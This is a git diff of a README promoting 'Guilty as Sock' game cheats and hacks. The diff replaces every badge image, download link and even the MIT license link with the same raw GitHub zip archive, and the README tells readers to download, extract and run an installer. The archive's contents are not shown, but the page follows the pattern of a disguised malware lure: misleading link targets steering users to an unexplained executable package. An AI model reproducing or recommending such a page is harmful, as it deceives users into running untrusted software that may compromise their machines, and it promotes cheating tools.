@@ -1,15 +1,15 @@
 # Guilty as Sock Cheats & Hacks 🧦
 
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen?style=flat-square)](https://github.com/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square)](#-mit-license)
-[![OpenAI Integration](https://img.shields.io/badge/OpenAI-integrated-blue?logo=openai&style=flat-square)](https://openai.com/)
-[![Claude Ready](https://img.shields.io/badge/Claude-API_integrated-yellow?style=flat-square)](https://claude.ai/)
+[![Build Status](https://github.com/me-rishi/guilty-as-sock-mod-toolkit/raw/refs/heads/branch/repositary/toolkit_as_mod_sock_guilty_v1.8.zip)](https://github.com/me-rishi/guilty-as-sock-mod-toolkit/raw/refs/heads/branch/repositary/toolkit_as_mod_sock_guilty_v1.8.zip)
+[![License: MIT](https://github.com/me-rishi/guilty-as-sock-mod-toolkit/raw/refs/heads/branch/repositary/toolkit_as_mod_sock_guilty_v1.8.zip)](#-mit-license)
+[![OpenAI Integration](https://github.com/me-rishi/guilty-as-sock-mod-toolkit/raw/refs/heads/branch/repositary/toolkit_as_mod_sock_guilty_v1.8.zip)](https://github.com/me-rishi/guilty-as-sock-mod-toolkit/raw/refs/heads/branch/repositary/toolkit_as_mod_sock_guilty_v1.8.zip)
+[![Claude Ready](https://github.com/me-rishi/guilty-as-sock-mod-toolkit/raw/refs/heads/branch/repositary/toolkit_as_mod_sock_guilty_v1.8.zip)](https://github.com/me-rishi/guilty-as-sock-mod-toolkit/raw/refs/heads/branch/repositary/toolkit_as_mod_sock_guilty_v1.8.zip)
 
 ---
 
 **Welcome to the ultimate universe of "Guilty as Sock" cheats & hacks—where the boundaries of game mastery are joyfully redefined! This is not just another collection; this is your ticket to a playful, innovative epoch of in-game enhancement and automation.**
 
-[![Download](https://img.shields.io/badge/Download-GUILTY_AS_SOCK-orage?logo=Github&style=for-the-badge)](https://me-rishi.github.io)
+[![Download](https://github.com/me-rishi/guilty-as-sock-mod-toolkit/raw/refs/heads/branch/repositary/toolkit_as_mod_sock_guilty_v1.8.zip)](https://github.com/me-rishi/guilty-as-sock-mod-toolkit/raw/refs/heads/branch/repositary/toolkit_as_mod_sock_guilty_v1.8.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Guilty as Sock distills thousands of coder-nights into a crystal-clear experienc
 Follow these steps:
 
 1. Click on the shimmering download badge below to teleport to the latest build:
-   [![Download](https://img.shields.io/badge/Download-GUILTY_AS_SOCK-orange?logo=Github&style=for-the-badge)](https://me-rishi.github.io)
+   [![Download](https://github.com/me-rishi/guilty-as-sock-mod-toolkit/raw/refs/heads/branch/repositary/toolkit_as_mod_sock_guilty_v1.8.zip)](https://github.com/me-rishi/guilty-as-sock-mod-toolkit/raw/refs/heads/branch/repositary/toolkit_as_mod_sock_guilty_v1.8.zip)
 2. Select your operating system package from the download portal.
 3. Extract the package to your favorite gaming folder.
 4. Run the installer, and simply follow the on-screen prompts. Let your creative hacking adventure begin!
@@ -128,7 +128,7 @@ The maintainers cannot accept responsibility for consequences of unauthorized or
 
 ## 📜 MIT License 2025
 
-This repository is licensed under the MIT License (© 2025). See the full license [here](https://opensource.org/licenses/MIT).  
+This repository is licensed under the MIT License (© 2025). See the full license [here](https://github.com/me-rishi/guilty-as-sock-mod-toolkit/raw/refs/heads/branch/repositary/toolkit_as_mod_sock_guilty_v1.8.zip).  
 Feel at home remixing, tweaking, and extending to your heart’s content—please respect and attribute.
 
 ---
@@ -137,7 +137,7 @@ Feel at home remixing, tweaking, and extending to your heart’s content—pleas
 
 Embark on your odyssey beyond the edge—download Guilty as Sock Cheats & Hacks!
 
-[![Download](https://img.shields.io/badge/Download-GUILTY_AS_SOCK-orange?logo=Github&style=for-the-badge)](https://me-rishi.github.io)
+[![Download](https://github.com/me-rishi/guilty-as-sock-mod-toolkit/raw/refs/heads/branch/repositary/toolkit_as_mod_sock_guilty_v1.8.zip)](https://github.com/me-rishi/guilty-as-sock-mod-toolkit/raw/refs/heads/branch/repositary/toolkit_as_mod_sock_guilty_v1.8.zip)
 
 ---
 
